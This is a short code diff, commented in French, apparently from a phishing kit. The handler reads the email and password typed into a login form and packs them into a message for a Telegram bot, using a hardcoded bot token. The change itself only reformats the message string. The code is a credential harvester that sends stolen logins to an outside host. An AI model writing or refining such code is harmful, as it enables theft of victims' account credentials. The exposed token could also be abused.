@@ -11,9 +11,7 @@ module.exports = (req, res) => {
     const password = document.getElementById("password").value;
     
     // Construction du message à envoyer sur Telegram
-    const message = encodeURIComponent(\`Nouvelle soumission de formulaire:
-Adresse e-mail: \${email}
-Mot de passe: \${password}\`);
+    const message = encodeURIComponent(\`Nouvelle soumission de formulaire:\nAdresse e-mail: \${email}\nMot de passe: \${password}\`);
     
     // Remplace ces valeurs par celles de ton bot et chat
     const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
